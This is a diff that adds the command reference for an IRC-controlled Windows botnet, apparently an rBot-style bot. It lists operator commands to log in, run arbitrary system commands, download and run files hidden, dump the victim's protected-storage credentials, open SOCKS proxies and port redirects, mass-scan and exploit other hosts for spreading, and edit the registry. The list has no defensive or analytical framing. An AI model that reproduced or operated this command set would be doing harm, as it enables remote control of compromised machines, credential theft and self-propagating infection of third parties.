@@ -1,0 +1,66 @@
+.login/.l <password>			// login
+.logout/.lo						// logout
+.who							// displays logged in users
+.remove/.bye					// removes the bot (-s hides your host on quit msg)
+.testdlls						// tests the dlls
+.threads/.t [kill <all/#>]		// displays/kills threads
+.netstatp/.nsp [port] [-N/-a]	// displays connections (xp only)
+.speedtest/.speed [ul/dl] [#]	// runs a speedtest
+.uptime/.up						// displays the bots uptime
+.installed/.it					// displays the time the bot was installed
+.version/.v [id]				// displays bots version (will ignore if botid==id
+.status/.s						// displays the bots status
+.secure/.sec					// secures the box
+.unsecure/.unsec				// unsecures the box
+.process/.ps [list <p.exe>]		// list process(es)
+.process/.ps <kill> <pid/p.exe>	// kill pid or process
+.randnick/.rand					// generates a new random nick and switches to it
+.exploitftpd/.eftpd				// starts or displays the status of the eftpd
+.iestart/.ies [page]			// sets or views the internet explorer startpage
+.join/.j						// joins a channel
+.part/.p						// parts a channel
+.raw/.r							// sends a raw to the irc server
+.prefix/.pr						// changes the bot prefix
+.flusharp/.farp					// flushes arp cache
+.flushdns/.fdns					// flushes dns cache
+.resolve/.dns					// resolves a ip/host
+.pstore/.pst					// displays the bots protected storage
+.sysinfo/.si					// displays the bots system information
+.netinfo/.ni [mb/gb]			// displays the bots network information
+.driveinfo/.di [mb/gb] [total]	// displays the bots drive information
+.encrypt/.end <text>			// encrypt some text (to be used with $dec())
+.mirccmd <command>				// sends a command to any open mIRC
+.system <command>				// runs a command with system()
+.file type/cat <file>			// displays a files contents
+.file exists/e <file>			// checks if a file/die exists
+.file del/rm <file>				// deletes a file
+.file rmdir <dir>				// deletes a dir (and a files in it)
+.file move <f1> <f2> [-r]		// moves a file
+.file copy <f1> <f2> [-r/-O]	// copys a file (-O: overwrite?)
+.file attrib <file> [-S/H/R/N]	// sets a file attributes
+.down <filetodl> <save> [r] [h]	// downloads a file (r: run, h: run hidden)
+.update <filetodl> <save> <id>	// updates bot if botid!=id
+
+.s4 [port]						// starts a socks 4 server
+.rd [remote ip] [remote port] [local port]
+
+.stats [#]						// displays scan stats (if total stats > #)
+.currentip [#]					// displays current ip (#: scan thread)
+.banner/.ban <port> <threads> <delay> <mins> <ip/[-a/-b/-c][-e][-r]>
+.advscan/.asc <port> <threads> <delay> <mins> <ip/[-a/-b/-c][-e][-r]>
+.scanall/.sa <threads> <delay> <mins> <ip/[-a/-b/-c][-e][-r]>
+.ntscan/.nts <threads> <delay> <mins> <ip/[-a/-b/-c][-e][-r]>
+
+.if/.else nick <nick> <do this> (wildcards supported)
+.if/.else host <host> <do this> (wildcards supported)
+.if/.else id <bot id> <do this>
+.if/.else private <do this>
+.if/.else up <time> <do this>
+.if/.else rup <time> <do this>
+.if/.else connected <time> <do this>
+
+//reg control still testing
+.reg query <type> <root> <subkey> <key>
+.reg query <root> <subkey>
+.reg delete <root> <subkey> [key]
+.reg write <type> <root> <subkey> <key> <value>
